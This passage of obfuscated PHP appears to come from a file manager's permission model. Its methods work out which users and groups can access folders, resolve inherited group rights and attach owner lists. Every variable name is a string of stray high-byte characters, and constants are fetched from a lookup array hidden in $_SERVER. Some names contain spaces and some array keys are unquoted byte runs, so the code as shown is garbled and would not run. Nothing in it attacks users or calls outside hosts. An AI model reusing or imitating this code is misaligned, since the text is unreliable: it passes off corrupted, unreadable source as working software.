$this->where(array($Ç»ì½‡[461] => array($Ç»ì½‡[462], $²× ÅŞÑ)))->delete(); return !0; } public function getAllChildren($õ½‡ø) { $§»š– =& $_SERVER[ ÇƒŠìÀ]; $ËÃœËæ = Model($§»š–[1368])->sourceInfo($õ½‡ø); if ($ËÃœËæ[$§»š–[455]] != $§»š–[90]) { return $this->sourceListAuth(array($õ½‡ø)); } if ($ËÃœËæ[$§»š–[180]] != SourceModel::TYPE_GROUP) { return array(); } $Œ†İ‡ˆ = 1; $ÌöÊŠòô = array($õ½‡ø); if ($ËÃœËæ[$§»š–[182]] == $§»š–[214] && $ËÃœËæ[$§»š–[540]] != $Œ†İ‡ˆ) { $ÌöÊŠòô = $this->groupChidldAllRootSource($ËÃœËæ[$§»š–[540]]); } $’Ä§ÕÓ = $this->field($§»š–[183])->group($§»š–[183])->select(); $’Ä§ÕÓ = array_to_keyvalue($’Ä§ÕÓ, $§»š–[12], $§»š–[183]); if (!$’Ä§ÕÓ) { return array(); } $‹€ƒ¥µÜ = $§»š–[2070]; $Ÿ˜›Ä¸ş = array($§»š–[183] => array($§»š–[7], $’Ä§ÕÓ), $§»š–[475] => $§»š–[214]); $™Ş­…ÔÈ = Model($§»š–[854])->field($‹€ƒ¥µÜ)->where($Ÿ˜›Ä¸ş)->select(); $İòí·óÊ = array($õ½‡ø); foreach ($™Ş­…ÔÈ as $½±†ÂÌñ) { foreach ($ÌöÊŠòô as $›ì’ÕœÊ) { $ÄïÆ³‹½ = $§»š–[50] . $›ì’ÕœÊ . $§»š–[50]; $ûŞĞ½Ö = $½±†ÂÌñ[$§»š–[555]] . $½±†ÂÌñ[$§»š–[183]] . $§»š–[50]; if (strstr($ûŞĞ½Ö, $ÄïÆ³‹½)) { $İòí·óÊ[] = $½±†ÂÌñ[$§»š–[183]]; break; } } } return $this->sourceListAuth($İòí·óÊ); } private function sourceListAuth($ï¬Å‹ÍŒ) { $¤ò¦¹ =& $_SERVER[ ÇƒŠìÀ]; $Øİ‘‰Åé = Model($¤ò¦¹[1368])->sourceListInfo($ï¬Å‹ÍŒ, !0); $ĞÍß“®Í = $this->sourceAuthSelect($ï¬Å‹ÍŒ); $èêĞ‚¡Ü = array(); $ˆ§çæÓ» = array(); foreach ($Øİ‘‰Åé as $™æÄıåŸ) { unset($™æÄıåŸ[$¤ò¦¹[499]]); unset($™æÄıåŸ[$¤ò¦¹[497]]); unset($™æÄıåŸ[$¤ò¦¹[457]]); unset($™æÄıåŸ[$¤ò¦¹[89]]); $ÃÙ®­ƒŠ = $ĞÍß“®Í[$™æÄıåŸ[$¤ò¦¹[183]]]; if (!$ÃÙ®­ƒŠ) { continue; } $™æÄıåŸ[$¤ò¦¹[2071]] = $this->authTargetInfo($ÃÙ®­ƒŠ); $™æÄıåŸ[$¤ò¦¹[553]] = rtrim($™æÄıåŸ[$¤ò¦¹[559]], $¤ò¦¹[8]) . $¤ò¦¹[8] . ltrim($™æÄıåŸ[$¤ò¦¹[553]], $¤ò¦¹[8]); $èêĞ‚¡Ü[] = $™æÄıåŸ; $ŠÌ©äŒó = count(explode($¤ò¦¹[8], trim($™æÄıåŸ[$¤ò¦¹[553]], $¤ò¦¹[8]))); $ˆ§çæÓ»[] = $ŠÌ©äŒó + ($™æÄıåŸ[$¤ò¦¹[33]] == $¤ò¦¹[77] ? 0 : 1000); } array_multisort($ˆ§çæÓ», SORT_ASC, $èêĞ‚¡Ü); return $èêĞ‚¡Ü; } private function groupChidldAllRootSource($•ôúş‘î) { $ÛÎ£Ï´¹ =& $_SERVER[ ÇƒŠìÀ]; $ê¿üö• = Model($ÛÎ£Ï´¹[2072])->groupChildrenAll($•ôúş‘î); $™­”’ = array($ÛÎ£Ï´¹[182] => 0, $ÛÎ£Ï´¹[540] => array($ÛÎ£Ï´¹[7], $ê¿üö•), $ÛÎ£Ï´¹[180] => SourceModel::TYPE_GROUP); $ÅûØ¤ö = Model($ÛÎ£Ï´¹[854])->field($ÛÎ£Ï´¹[183])->where($™­”’)->select(); $ÅûØ¤ö = array_to_keyvalue($ÅûØ¤ö, $ÛÎ£Ï´¹[12], $ÛÎ£Ï´¹[183]); return $ÅûØ¤ö; } private function authTargetInfo($»Õ§Æ½) { $¹·Ë’¢Â =& $_SERVER[ ÇƒŠìÀ]; $±ÏµÀ¢° = array(); $ÊÛ“çØî = array(); $´â„ÎâÑ = 2 << 25; foreach ($»Õ§Æ½ as $’¬…äªÏ) { $Ñ¦¯õêÊ = Model($¹·Ë’¢Â[542])->listData($’¬…äªÏ[$¹·Ë’¢Â[1991]]); if (!$Ñ¦¯õêÊ) { continue; } if ($’¬…äªÏ[$¹·Ë’¢Â[180]] == SourceModel::TYPE_USER) { $ÁîÛ‘× = Model($¹·Ë’¢Â[548])->getInfoSimpleOuter($’¬…äªÏ[$¹·Ë’¢Â[540]]); if ($ÁîÛ‘×[$¹·Ë’¢Â[1689]] == $¹·Ë’¢Â[1223]) { continue; } if ($ÁîÛ‘×[$¹·Ë’¢Â[1689]] == $¹·Ë’¢Â[214]) { $ÁîÛ‘×[$¹·Ë’¢Â[32]] = LNG($¹·Ë’¢Â[2073]); } } else { $ÁîÛ‘× = Model($¹·Ë’¢Â[556])->getInfoSimple($’¬…äªÏ[$¹·Ë’¢Â[540]]); } if (!$ÁîÛ‘×) { continue; } $ÁîÛ‘×[$¹·Ë’¢Â[510]] = $Ñ¦¯õêÊ; $±ÏµÀ¢°[] = $ÁîÛ‘×; $õƒ—‘£ = 0; if ($’¬…äªÏ[$¹·Ë’¢Â[180]] == SourceModel::TYPE_GROUP) { $õƒ—‘£ = $´â„ÎâÑ * 2; } if ($’¬…äªÏ[$¹·Ë’¢Â[180]] == SourceModel::TYPE_USER) { $õƒ—‘£ = $´â„ÎâÑ; } if ($’¬…äªÏ[$¹·Ë’¢Â[180]] == SourceModel::TYPE_USER && $’¬…äªÏ[$¹·Ë’¢Â[540]] == $¹·Ë’¢Â[214]) { $õƒ—‘£ = 0; } $ÊÛ“çØî[] = $Ñ¦¯õêÊ[$¹·Ë’¢Â[457]] + $õƒ—‘£; } array_multisort($ÊÛ“çØî, SORT_DESC, $±ÏµÀ¢°); return $±ÏµÀ¢°; } public function getAllChildrenByUser($Â¦·Çº, $ãÏÈšƒÂ) { $‹‘ßñ‘ê =& $_SERVER[ ÇƒŠìÀ]; $­ş¨Ãœ = Model($‹‘ßñ‘ê[569])->getInfo($ãÏÈšƒÂ); if (!$ãÏÈšƒÂ || !$Â¦·Çº || !$­ş¨Ãœ) { return array(); } $¼Ÿ¡ÊÇ = Model($‹‘ßñ‘ê[1368])->sourceInfo($Â¦·Çº); $×´ª˜Øç = array(); $äÓ‘ìôª = 1; if ($¼Ÿ¡ÊÇ[$‹‘ßñ‘ê[182]] == $‹‘ßñ‘ê[214] && $¼Ÿ¡ÊÇ[$‹‘ßñ‘ê[540]] != $äÓ‘ìôª && $this->groupContainUser($¼Ÿ¡ÊÇ[$‹‘ßñ‘ê[540]], $ãÏÈšƒÂ)) { foreach ($­ş¨Ãœ[$‹‘ßñ‘ê[2074]] as $øĞ¨ÃÍÄ) { $È¶öİ† = Model($‹‘ßñ‘ê[556])->getInfo($øĞ¨ÃÍÄ[$‹‘ßñ‘ê[1887]]); $ë’¼ØÖ” = Model($‹‘ßñ‘ê[569])->getInfoSimpleOuter($ãÏÈšƒÂ); $ë’¼ØÖ”[$‹‘ßñ‘ê[510]] = $øĞ¨ÃÍÄ[$‹‘ßñ‘ê[457]]; if (Model($‹‘ßñ‘ê[542])->authCheckAction($øĞ¨ÃÍÄ[$‹‘ßñ‘ê[457]][$‹‘ßñ‘ê[457]], $‹‘ßñ‘ê[1908])) { continue; } $œçÅÄæß = array($‹‘ßñ‘ê[32] => $‹‘ßñ‘ê[1243] . $È¶öİ†[$‹‘ßñ‘ê[32]], $‹‘ßñ‘ê[183] => $È¶öİ†[$‹‘ßñ‘ê[89]][$‹‘ßñ‘ê[183]], $‹‘ßñ‘ê[86] => KodIO::make($È¶öİ†[$‹‘ßñ‘ê[89]][$‹‘ßñ‘ê[183]]), $‹‘ßñ‘ê[182] => $‹‘ßñ‘ê[214], $‹‘ßñ‘ê[180] => $‹‘ßñ‘ê[549], $‹‘ßñ‘ê[33] => $‹‘ßñ‘ê[586], $‹‘ßñ‘ê[553] => $È¶öİ†[$‹‘ßñ‘ê[560]], $‹‘ßñ‘ê[1887] => $È¶öİ†[$‹‘ßñ‘ê[1887]], $‹‘ßñ‘ê[557] => $È¶öİ†[$‹‘ßñ‘ê[182]], $‹‘ßñ‘ê[2071] => array($ë’¼ØÖ”)); $×´ª˜Øç[$œçÅÄæß[$‹‘ßñ‘ê[183]]] = $œçÅÄæß; } } $ïŒöµ = array(); $ßÏõ¹ò¤ = $this->getAllChildren($Â¦·Çº); foreach ($ßÏõ¹ò¤ as $¦Ù‡·äŠ) { $îïŸëœÂ = !1; foreach ($¦Ù‡·äŠ[$‹‘ßñ‘ê[2071]] as $ö£ºµ±) { if ($ö£ºµ±[$‹‘ßñ‘ê[1689]]) { if ($ö£ºµ±[$‹‘ßñ‘ê[1689]] == $ãÏÈšƒÂ) { $îïŸëœÂ = !0; break; } } if ($ö£ºµ±[$‹‘ßñ‘ê[1887]]) { if ($this->groupContainUser($ö£ºµ±[$‹‘ßñ‘ê[1887]], $ãÏÈšƒÂ)) { $îïŸëœÂ = !0; break; } } } if ($îïŸëœÂ) { $ïŒöµ[] = $¦Ù‡·äŠ; } $Øˆ§ÂÕÒ = $¦Ù‡·äŠ[$‹‘ßñ‘ê[183]]; if (isset($×´ª˜Øç[$Øˆ§ÂÕÒ])) { $¦Ù‡·äŠ[$‹‘ßñ‘ê[2071]][] = $×´ª˜Øç[$Øˆ§ÂÕÒ][0]; $×´ª˜Øç[$Øˆ§ÂÕÒ] = !1; } } $×´ª˜Øç = array_filter(array_values($×´ª˜Øç)); $ïŒöµ = array_merge($×´ª˜Øç, $ïŒöµ); return $ïŒöµ; } public function setAllChildrenByUser($ ğĞâ–¨, $À«¥àà», $ãÏ›‰è¢) { $Î··Àâ =& $_SERVER[ ÇƒŠìÀ]; $‚ÄÎÍ‹Î = $this->getAllChildrenByUser($ ğĞâ–¨, $À«¥àà»); if (!$ãÏ›‰è¢ || !$‚ÄÎÍ‹Î) { return !1; } foreach ($‚ÄÎÍ‹Î as $¦Àï‹”Ì) { $¦Ô… = array(); foreach ($¦Àï‹”Ì[$Î··Àâ[2071]] as $Ê·ËÊÆ÷) { $œ×…ö²Ï = $Ê·ËÊÆ÷[$Î··Àâ[510]]; $Ô³Â†¥ = $Ê·ËÊÆ÷[$Î··Àâ[1689]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $…—Ä½Ìİ = $Ê·ËÊÆ÷[$Î··Àâ[1689]] ? $Ê·ËÊÆ÷[$Î··Àâ[1689]] : $Ê·ËÊÆ÷[$Î··Àâ[1887]]; if ($Ê·ËÊÆ÷[$Î··Àâ[1689]] && $Ê·ËÊÆ÷[$Î··Àâ[1689]] == $À«¥àà») { continue; } $¦Ô…[] = array($Î··Àâ[183] => $¦Àï‹”Ì[$Î··Àâ[183]], $Î··Àâ[180] => $Ô³Â†¥, $Î··Àâ[540] => intval($…—Ä½Ìİ), $Î··Àâ[1991] => isset($œ×…ö²Ï[$Î··Àâ[445]]) ? intval($œ×…ö²Ï[$Î··Àâ[445]]) : 0, $Î··Àâ[2051] => isset($œ×…ö²Ï[$Î··Àâ[2051]]) ? intval($œ×…ö²Ï[$Î··Àâ[2051]]) : -1); } $¦Ô…[] = array($Î··Àâ[183] => $¦Àï‹”Ì[$Î··Àâ[183]], $Î··Àâ[180] => SourceModel::TYPE_USER, $Î··Àâ[540] => intval($À«¥àà»), $Î··Àâ[1991] => intval($ãÏ›‰è¢), $Î··Àâ[2051] => -1); $this->where(array($Î··Àâ[461] => $¦Àï‹”Ì[$Î··Àâ[183]]))->delete(); $this->addAll($¦Ô…); } return !0; } public function get($½ÁÇß¨) { $¹Æ‹ë¸² = $this->getSourceList(array($½ÁÇß¨), !0); return $¹Æ‹ë¸²[0]; } public function getSourceList($¿ªÒúô, $æã”£‡¥ = false, $€¨©ñ¨£ = false) { $ä…¸¢ßĞ =& $_SERVER[ ÇƒŠìÀ]; if (!$¿ªÒúô) { return array(); } $®¹ªú¸» = Model($ä…¸¢ßĞ[1368]); if (!$æã”£‡¥ && count($¿ªÒúô) == 1) { $æã”£‡¥ = array(); $æã”£‡¥[$¿ªÒúô[0]] = $®¹ªú¸»->sourceInfo($¿ªÒúô[0]); } if (!$æã”£‡¥) { $Ùòù»şÁ = array($ä…¸¢ßĞ[461] => array($ä…¸¢ßĞ[462], $¿ªÒúô)); $æã”£‡¥ = $®¹ªú¸»->field($ä…¸¢ßĞ[2075])->where($Ùòù»şÁ)->select(); $æã”£‡¥ = array_to_keyvalue($æã”£‡¥, $ä…¸¢ßĞ[183]); } $äÇô¬‡Ó = $¿ªÒúô; foreach ($æã”£‡¥ as $í¾Ìïó => $ç¸€¿ÄÌ) { $»Ï¼˜ = $®¹ªú¸»->parentLevelArray($ç¸€¿ÄÌ[$ä…¸¢ßĞ[555]]); $äÇô¬‡Ó = array_merge($äÇô¬‡Ó, array($í¾Ìïó), array_reverse($»Ï¼˜)); } $äÇô¬‡Ó = array_values(array_unique($äÇô¬‡Ó)); if (!$äÇô¬‡Ó) { return array(); } $˜™ä½ ² = $this->sourceAuthSelect($äÇô¬‡Ó); $Óíö÷ÚÌ = array(); foreach ($äÇô¬‡Ó as $·ËŞåøã) { if (isset($˜™ä½ ²[$·ËŞåøã])) { $Óíö÷ÚÌ[$·ËŞåøã] = $˜™ä½ ²[$·ËŞåøã]; } } $ƒ×›èñ° = $this->userIsRoot($€¨©ñ¨£); $ÌØìÇ³Ğ = AuthModel::authAll(); $îÑ…äàç = array($ä…¸¢ßĞ[458] => $ÌØìÇ³Ğ, $ä…¸¢ßĞ[2076] => array($ä…¸¢ßĞ[463] => 0, $ä…¸¢ßĞ[1893] => $ÌØìÇ³Ğ, $ä…¸¢ßĞ[464] => LNG($ä…¸¢ßĞ[2077]), $ä…¸¢ßĞ[1910] => $ä…¸¢ßĞ[2078])); $¢“óãİü = array(); foreach ($æã”£‡¥ as $·ËŞåøã => $–ÀºÎ‘¡) { if ($ƒ×›èñ° && $GLOBALS[$ä…¸¢ßĞ[6]][$ä…¸¢ßĞ[1906]]) { $¢“óãİü[$·ËŞåøã] = $îÑ…äàç; continue; } $¢“óãİü[$·ËŞåøã] = $this->makeSourceAuth($–ÀºÎ‘¡, $Óíö÷ÚÌ, $€¨©ñ¨£); } return $¢“óãİü; } public function authDeepCheck($É²ù·œ¹, $âÙ×éô³ = false) { $Á‘Éš¨ë =& $_SERVER[ ÇƒŠìÀ]; $âÙ×éô³ = $âÙ×éô³ ? $âÙ×éô³ : USER_ID; $ŸÙÖ—¨ù = $this->makeAuthDeep($âÙ×éô³); if (!in_array($É²ù·œ¹, $ŸÙÖ—¨ù[$Á‘Éš¨ë[2079]])) { return !1; } $¾¾£Ëşš = array(); foreach ($ŸÙÖ—¨ù[$Á‘Éš¨ë[2080]] as $ó«Áõ‘ => $êüà´£®) { if (!in_array($É²ù·œ¹, $êüà´£®)) { continue; } $¾¾£Ëşš[] = $ó«Áõ‘; } if (!$¾¾£Ëşš) { return !1; } $–Ö½ê… = $¾¾£Ëşš ? $¾¾£Ëşš[0] : $É²ù·œ¹; return array($Á‘Éš¨ë[458] => -1, $Á‘Éš¨ë[510] => array($Á‘Éš¨ë[463] => $Á‘Éš¨ë[1223], $Á‘Éš¨ë[1893] => $Á‘Éš¨ë[214], $Á‘Éš¨ë[464] => LNG($Á‘Éš¨ë[2081]), $Á‘Éš¨ë[1910] => $Á‘Éš¨ë[2082]), $Á‘Éš¨ë[2083] => LNG($Á‘Éš¨ë[2084]), $Á‘Éš¨ë[2085] => $this->sourceAuthInfo($–Ö½ê…)); } protected function makeAuthDeep($êßÔ­Ù£ = false) { $ƒşÎ§È· =& $_SERVER[ ÇƒŠìÀ]; static $¹§Êã¡Ê = array(); $êßÔ­Ù£ = $êßÔ­Ù£ ? $êßÔ­Ù£ : USER_ID; if (isset($¹§Êã¡Ê[$êßÔ­Ù£])) { return $¹§Êã¡Ê[$êßÔ­Ù£]; } $Ş¸–âñ = Model($ƒşÎ§È·[2086])->listData(); $ŞÓ—„ = array(); foreach ($Ş¸–âñ as $–§·²ñ¨) { if ($–§·²ñ¨[$ƒşÎ§È·[457]] == 0 && $–§·²ñ¨[$ƒşÎ§È·[1909]] == $ƒşÎ§È·[90]) { $ŞÓ—„[] = $–§·²ñ¨[$ƒşÎ§È·[445]]; } } $Ğ¥èĞ¶ = $this->userGroupParents($êßÔ­Ù£); $½†¦½Î = array($ƒşÎ§È·[180] => SourceModel::TYPE_USER, $ƒşÎ§È·[540] => $êßÔ­Ù£); if ($Ğ¥èĞ¶) { $½†¦½Î = array(array($ƒşÎ§È·[180] => SourceModel::TYPE_USER, $ƒşÎ§È·[540] => $êßÔ­Ù£), array($ƒşÎ§È·[180] => SourceModel::TYPE_GROUP, $ƒşÎ§È·[540] => array($ƒşÎ§È·[462], $Ğ¥èĞ¶)), $ƒşÎ§È·[1035] => $ƒşÎ§È·[1985]); } $©Î´ÂÓ§ = $this->field($ƒşÎ§È·[2087])->where($½†¦½Î)->select(); $‚Ğ¼ü¬ = array(); $Õàø·Õš = array_to_keyvalue_group($©Î´ÂÓ§, $ƒşÎ§È·[183]); foreach ($Õàø·Õš as $ç¡öÄê => $»ğŒ¤¢Ä) { $ş½« ìî = $this->authArrayCheck($»ğŒ¤¢Ä, $êßÔ­Ù£); if ($ş½« ìî[$ƒşÎ§È·[458]] > 0) { $‚Ğ¼ü¬[] = $ç¡öÄê . $ƒşÎ§È·[12]; } } if ($Ğ¥èĞ¶) { $ÀÃ‡ÚÈÅ = Model($ƒşÎ§È·[556]); foreach ($Ğ¥èĞ¶ as $¼©µĞï) { $Œ¨Ô£áï = $ÀÃ‡ÚÈÅ->getInfo($¼©µĞï); if (!$Œ¨Ô£áï || !is_array($Œ¨Ô£áï[$ƒşÎ§È·[89]])) { continue; } $‚Ğ¼ü¬[] = $Œ¨Ô£áï[$ƒşÎ§È·[89]][$ƒşÎ§È·[183]]; } } $¨í¡­’¨ = array(); $°®™ò©º = $Ğ¥èĞ¶; $˜ßÖ–Ä¤ = Model($ƒşÎ§È·[1368]); $ÀÃ‡ÚÈÅ = Model($ƒşÎ§È·[556]); $„•Ú«¦‡ = array(); $Ì»œö¦ = array(); $‹…Øº = array(); $ªÇÒ¿ÑÏ = array(); if ($‚Ğ¼ü¬) { $­á¬ø©ü = $˜ßÖ–Ä¤->where(array($ƒşÎ§È·[183] => array($ƒşÎ§È·[462], $‚Ğ¼ü¬)))->select(); foreach ($­á¬ø©ü as $ÓğüÙéœ) { $Æï¹ˆ§Ñ = $˜ßÖ–Ä¤->parentLevelArray($ÓğüÙéœ[$ƒşÎ§È·[555]]); $¨í¡­’¨ = array_merge($¨í¡­’¨, $Æï¹ˆ§Ñ); $°®™ò©º[] = $ÓğüÙéœ[$ƒşÎ§È·[540]]; $„•Ú«¦‡[$ÓğüÙéœ[$ƒşÎ§È·[183]]] = $Æï¹ˆ§Ñ; $Ì»œö¦[$ÓğüÙéœ[$ƒşÎ§È·[183]]] = $ÓğüÙéœ[$ƒşÎ§È·[540]]; } } $°®™ò©º = array_values(array_unique($°®™ò©º)); $ ÅôşÜá = $°®™ò©º; foreach ($ ÅôşÜá as $¼©µĞï) { $Œ¨Ô£áï = $ÀÃ‡ÚÈÅ->getInfo($¼©µĞï); $Æï¹ˆ§Ñ = $˜ßÖ–Ä¤->parentLevelArray($Œ¨Ô£áï[$ƒşÎ§È·[555]]); $°®™ò©º = array_merge($°®™ò©º, $Æï¹ˆ§Ñ); } $°®™ò©º = array_values(array_unique($°®™ò©º)); foreach ($°®™ò©º as $¼©µĞï) { $Œ¨Ô£áï = $ÀÃ‡ÚÈÅ->getInfo($¼©µĞï); $¨í¡­’¨[] = $Œ¨Ô£áï[$ƒşÎ§È·[89]][$ƒşÎ§È·[183]]; $‹…Øº[$¼©µĞï] = $Œ¨Ô£áï[$ƒşÎ§È·[89]][$ƒşÎ§È·[183]]; $ªÇÒ¿ÑÏ[$¼©µĞï] = $˜ßÖ–Ä¤->parentLevelArray($Œ¨Ô£áï[$ƒşÎ§È·[555]]); } foreach ($„•Ú«¦‡ as $†À„è™ô => $èÇŠ»¦Ò) { $”•Â–³ = $Ì»œö¦[$†À„è™ô]; if (!$”•Â–³ || !$‹…Øº[$”•Â–³]) { continue; } $Ë’ÂŒä = array(); foreach ($ªÇÒ¿ÑÏ[$”•Â–³] as $¼©µĞï) { $Ë’ÂŒä[] = $‹…Øº[$¼©µĞï]; } $„•Ú«¦‡[$†À„è™ô] = array_merge($Ë’ÂŒä, $èÇŠ»¦Ò); } $¨í¡­’¨ = array_values(array_unique($¨í¡­’¨)); $†èÁÔÜ = array($ƒşÎ§È·[2079] => $¨í¡­’¨, $ƒşÎ§È·[2080] => $„•Ú«¦‡); $¹§Êã¡Ê[$êßÔ­Ù£] = $†èÁÔÜ; return $†èÁÔÜ; } private function makeSourceAuth($—‰É¸á, $Î€ØÄá—, $ÛæïµÙ³ = false) { $“ÓşÈõ£ =& $_SERVER[ ÇƒŠìÀ]; $ç¸”Àï– = $“ÓşÈõ£[90]; $º¯–ÎÛë = $—‰É¸á[$“ÓşÈõ£[540]]; $°úƒ‚»˜ = $—‰É¸á[$“ÓşÈõ£[180]] == SourceModel::TYPE_GROUP; $ôèÊšÁ = $°úƒ‚»˜ ? $this->groupRootAuth($º¯–ÎÛë, $ÛæïµÙ³) : !1; if ($ôèÊšÁ && Model($“ÓşÈõ£[542])->authCheckAction($ôèÊšÁ[$“ÓşÈõ£[457]], $“ÓşÈõ£[1908])) { return $this->groupAuthInfo($ôèÊšÁ, $º¯–ÎÛë); } $‘ø»Õ³ = Model($“ÓşÈõ£[1368])->parentLevelArray($—‰É¸á[$“ÓşÈõ£[555]]); $‘ø»Õ³ = array_merge(array($—‰É¸á[$“ÓşÈõ£[183]]), array_reverse($‘ø»Õ³)); $ğœß²˜¶ = !1; foreach ($‘ø»Õ³ as $Ò—ğ€¤’) { if (!isset($Î€ØÄá—[$Ò—ğ€¤’])) { continue; } $¸ÈÕõÆ = $this->authMake($Î€ØÄá—[$Ò—ğ€¤’], $ÛæïµÙ³); if ($¸ÈÕõÆ[$“ÓşÈõ£[510]]) { $ğœß²˜¶ = $¸ÈÕõÆ; break; } } if (!$°úƒ‚»˜) { return $ğœß²˜¶; } if (!$ğœß²˜¶ && $ôèÊšÁ) { $ğœß²˜¶ = $this->groupAuthInfo($ôèÊšÁ, $º¯–ÎÛë); } if (!$ğœß²˜¶) { $«µÍ = Model($“ÓşÈõ£[556])->getInfo($º¯–ÎÛë); $ÙıÃî¬Ÿ = explode($“ÓşÈõ£[50], trim($«µÍ[$“ÓşÈõ£[555]], $“ÓşÈõ£[50])); $ÙıÃî¬Ÿ = array_reverse($ÙıÃî¬Ÿ); foreach ($ÙıÃî¬Ÿ as $½·‚õßç) { if ($½·‚õßç == $“ÓşÈõ£[214] || $½·‚õßç == $ç¸”Àï–) { continue; } $–í±Ÿ = $this->groupRootAuth($½·‚õßç, $ÛæïµÙ³); if (!$–í±Ÿ) { continue; } $ğœß²˜¶ = $this->groupAuthInfo($–í±Ÿ, $½·‚õßç); break; } } if (!$ğœß²˜¶ || $ğœß²˜¶[$“ÓşÈõ£[458]] <= 0) { $Š“Ÿé˜Ş = $this->authDeepCheck($—‰É¸á[$“ÓşÈõ£[183]], $ÛæïµÙ³); if ($Š“Ÿé˜Ş) { $ğœß²˜¶ = $Š“Ÿé˜Ş; } } return $ğœß²˜¶; } private function userIsRoot($ø¾ªÀµ = false) { $®Äêà®× =& $_SERVER[ ÇƒŠìÀ]; if (!$ø¾ªÀµ && KodUser::isRoot()) { return !0; } $ÌÒÜ…· = Model($®Äêà®×[569])->getInfo($ø¾ªÀµ); $©²ªÁÙÄ = Model($®Äêà®×[2088])->listData($ÌÒÜ…·[$®Äêà®×[2089]]); if ($©²ªÁÙÄ && $©²ªÁÙÄ[$®Äêà®×[546]][$®Äêà®×[2090]] == 1) { return !0; } return !1; } private function sourceAuthInfo($şôüğÊŞ) { $»ó¤ƒ±¸ =& $_SERVER[ ÇƒŠìÀ]; $¥¬­£‹Ã = Model($»ó¤ƒ±¸[1368]); $·×ä¸ß = $¥¬­£‹Ã->sourceInfo($şôüğÊŞ); if (!$·×ä¸ß) { return !1; } $¥¬­£‹Ã->groupPathDisplay($·×ä¸ß); $„âËà¤Ë = array($·×ä¸ß); $„âËà¤Ë = $¥¬­£‹Ã->_listAppendPath($„âËà¤Ë); $·×ä¸ß = $„âËà¤Ë[0]; $ô›¯¼ä® = $·×ä¸ß[$»ó¤ƒ±¸[553]]; if (isset($·×ä¸ß[$»ó¤ƒ±¸[561]])) { $Ìº„ÚË = explode($»ó¤ƒ±¸[8], trim($·×ä¸ß[$»ó¤ƒ±¸[553]], $»ó¤ƒ±¸[8])); array_shift($Ìº„ÚË); $ô›¯¼ä® = $·×ä¸ß[$»ó¤ƒ±¸[559]] . $»ó¤ƒ±¸[2091] . implode($»ó¤ƒ±¸[8], $Ìº„ÚË); } return array($»ó¤ƒ±¸[464] => $·×ä¸ß[$»ó¤ƒ±¸[32]], $»ó¤ƒ±¸[86] => KodIO::make($·×ä¸ß[$»ó¤ƒ±¸[183]]), $»ó¤ƒ±¸[2092] => $ô›¯¼ä®); } private function groupAuthInfo($úğ¬ïõÖ, $ÁÄ‡õ˜Ø) { $»Åò«­ˆ =& $_SERVER[ ÇƒŠìÀ]; $ØÑÕıà© = Model($»Åò«­ˆ[556])->getInfo($ÁÄ‡õ˜Ø); return array($»Åò«­ˆ[2093] => intval($úğ¬ïõÖ[$»Åò«­ˆ[457]]), $»Åò«­ˆ[2076] => $úğ¬ïõÖ, $»Åò«­ˆ[2094] => LNG($»Åò«­ˆ[2095]), $»Åò«­ˆ[2085] => array($»Åò«­ˆ[464] => $ØÑÕıà©[$»Åò«­ˆ[32]], $»Åò«­ˆ[86] => KodIO::make($ØÑÕıà©[$»Åò«­ˆ[89]][$»Åò«­ˆ[183]]), $»Åò«­ˆ[2092] => $ØÑÕıà©[$»Åò«­ˆ[560]])); } protected function groupRootAuth($á¨êõË, $ Ÿ¹¥è = false) { $ö¦òË® =& $_SERVER[ ÇƒŠìÀ]; $ Ÿ¹¥è = $ Ÿ¹¥è ? $ Ÿ¹¥è : USER_ID; $È¨¶Ğˆ° = $ Ÿ¹¥è . $ö¦òË®[2096] . $á¨êõË; static $‘­§‰à = array(); if (isset($‘­§‰à[$È¨¶Ğˆ°])) { return $‘­§‰à[$È¨¶Ğˆ°]; } $üÀò÷ˆ = Model($ö¦òË®[556])->getInfo($á¨êõË); $©«ÊıŠ‚ = $this->userGroupList($ Ÿ¹¥è); $è‘¼Üİ– = isset($©«ÊıŠ‚[$á¨êõË]) ? $©«ÊıŠ‚[$á¨êõË][$ö¦òË®[457]] : !1; if ($è‘¼Üİ– && Model($ö¦òË®[542])->authCheckAction($è‘¼Üİ–[$ö¦òË®[457]], $ö¦òË®[1908])) { $‘­§‰à[$È¨¶Ğˆ°] = $è‘¼Üİ–; return $è‘¼Üİ–; } $¿§š“ªÁ = $this->sourceAuthSelect($üÀò÷ˆ[$ö¦òË®[89]][$ö¦òË®[183]]); $ÙèÅóºß = $¿§š“ªÁ ? $this->authMake($¿§š“ªÁ, $ Ÿ¹¥è) : !1; $Ï±ŠºÁÀ = $ÙèÅóºß ? $ÙèÅóºß[$ö¦òË®[510]] : !1; $‘­§‰à[$È¨¶Ğˆ°] = $Ï±ŠºÁÀ ? $Ï±ŠºÁÀ : $è‘¼Üİ–; return $‘­§‰à[$È¨¶Ğˆ°]; } public function authOwnerApply($úÔ±Ü‰İ) { $ùûêûş =& $_SERVER[ ÇƒŠìÀ]; if (empty($úÔ±Ü‰İ[$ùûêûş[457]]) || isset($úÔ±Ü‰İ[$ùûêûş[2097]]) && $úÔ±Ü‰İ[$ùûêûş[2097]]) { return $úÔ±Ü‰İ; } if (AuthModel::authCheckRoot($úÔ±Ü‰İ[$ùûêûş[457]][$ùûêûş[458]])) { return $úÔ±Ü‰İ; } $Ê¾òˆ‰« = Model($ùûêûş[1368])->parentLevelArray($úÔ±Ü‰İ[$ùûêûş[555]]); $Ê¾òˆ‰« = array_merge(array($úÔ±Ü‰İ[$ùûêûş[183]]), array_reverse($Ê¾òˆ‰«)); $¼Ñ•»Ş¨ = $this->sourceAuthSelect($Ê¾òˆ‰«); $»àê˜Ç² = array(); $Æ¾ªê·¬ = array(); foreach ($¼Ñ•»Ş¨ as $—®¤ĞÍ => $§Ëèóà) { $Œ‚Ü™„ = $this->authFolderOwnerUser($§Ëèóà); $»àê˜Ç²[$—®¤ĞÍ] = $Œ‚Ü™„; $Æ¾ªê·¬ = array_merge($Æ¾ªê·¬, $Œ‚Ü™„[$ùûêûş[632]]); if ($Œ‚Ü™„[$ùûêûş[2098]]) { break; } } if (count($Æ¾ªê·¬) == 0) { $Æ¾ªê·¬ = $this->authFolderOwnerGroup($úÔ±Ü‰İ[$ùûêûş[540]]); } $Æ¾ªê·¬ = array_unique($Æ¾ªê·¬); if (AuthModel::authCheckRoot($úÔ±Ü‰İ[$ùûêûş[457]][$ùûêûş[458]])) { $Æ¾ªê·¬[] = USER_ID; } $úÔ±Ü‰İ[$ùûêûş[457]][$ùûêûş[2099]] = Model($ùûêûş[548])->userListInfo($Æ¾ªê·¬); return $úÔ±Ü‰İ; } private function 